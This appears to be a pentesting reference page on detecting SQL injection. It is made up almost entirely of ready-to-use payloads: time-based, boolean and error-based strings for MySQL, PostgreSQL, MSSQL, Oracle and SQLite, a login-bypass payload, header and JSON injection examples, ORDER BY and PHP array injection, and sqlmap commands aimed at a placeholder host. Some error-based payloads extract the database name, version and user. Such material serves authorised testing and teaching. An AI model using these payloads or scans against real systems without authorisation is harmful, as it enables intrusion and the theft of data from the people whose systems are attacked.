---
tags:
  - critical
  - server-side
---

# SQLi Detection

## Entry Point Identification

Test these characters in every input field, URL parameter, header, and cookie:

```sql
'          -- Single quote
"          -- Double quote
`          -- Backtick (MySQL)
')         -- Closing parenthesis
%27        -- URL-encoded quote
1' AND '1'='1  -- Boolean test
```

## Confirm Vulnerability

### Boolean Logic Test

```sql
-- Should return normal/true
' AND 1=1-- -
1 AND 1=1

-- Should return different/false  
' AND 1=2-- -
1 AND 1=2

-- Always true (good for blind detection)
' OR 1=1-- -
```

### Timing Confirmation

When no visible difference between true/false:

```sql
-- MySQL
' AND SLEEP(5)-- -
' AND (SELECT SLEEP(5))-- -
' AND IF(1=1, SLEEP(5), 0)-- -

-- PostgreSQL
' AND pg_sleep(5)-- -
'; SELECT pg_sleep(5)-- -
' || pg_sleep(5)-- -

-- MSSQL
'; WAITFOR DELAY '0:0:5'-- -
' IF 1=1 WAITFOR DELAY '0:0:5'-- -

-- Oracle
' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=1-- -

-- SQLite
' AND 123=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(1000000000/2))))-- -
```

### Error-Based Detection

Force SQL errors to confirm injection:

```sql
-- MySQL
' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))-- -
' AND UPDATEXML(1,CONCAT(0x7e,version()),1)-- -

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -

-- Oracle
' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT user FROM dual))-- -
```

## Common Injection Points

### URL Parameters

```http
GET /products?id=1' OR 1=1-- - HTTP/1.1
GET /search?q=test' AND SLEEP(5)-- - HTTP/1.1
```

### POST Data

```http
POST /login HTTP/1.1

username=admin'-- -&password=anything
```

### HTTP Headers

```http
Cookie: session=abc' AND 1=1-- -
Referer: '+(SELECT SLEEP(5))+'
User-Agent: ' OR 1=1-- -
X-Forwarded-For: 127.0.0.1' AND SLEEP(5)-- -
```

### JSON Payloads

```json
{"id": "1' OR 1=1-- -"}
{"search": "test' AND SLEEP(5)-- -"}
```

## Second-Order SQLi

Payload stored in one location, executed in another:

```sql
-- Register with malicious username
Username: admin'--

-- Later, username used in unsafe query
SELECT * FROM logs WHERE user='admin'--'
-- The comment breaks the query elsewhere
```

**Where to look:**
- User registration → Profile display
- Comment submission → Admin panel
- File upload names → Log viewers

## ORDER BY Injection

When injection is in ORDER BY clause:

```sql
-- Boolean-based
?sort=CASE WHEN (1=1) THEN column1 ELSE column2 END

-- Time-based
?sort=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1*(SELECT 1 FROM pg_sleep(5)) END)

-- Error-based
?sort=1/0
```

## Array Parameter Injection (PHP)

```http
groups[]=1&groups[]=2) OR 1=1--
```

PHP `implode()` on array can create injection point.

## Detection Automation

```bash
# sqlmap basic scan
sqlmap -u "http://target.com/?id=1" --batch

# Test all parameters
sqlmap -u "http://target.com/?id=1&cat=2" -p "id,cat" --batch

# POST data
sqlmap -u "http://target.com/login" --data="user=admin&pass=test" --batch

# With cookies
sqlmap -u "http://target.com/profile" --cookie="session=abc123" --batch

# Headers
sqlmap -u "http://target.com/" --headers="X-Custom: test" --batch
```

## Indicators of Vulnerability

- SQL error messages in response
- Different page content for `1=1` vs `1=2`
- Response time difference with SLEEP()
- Changes in result count/data
- Boolean changes in redirects or status codes
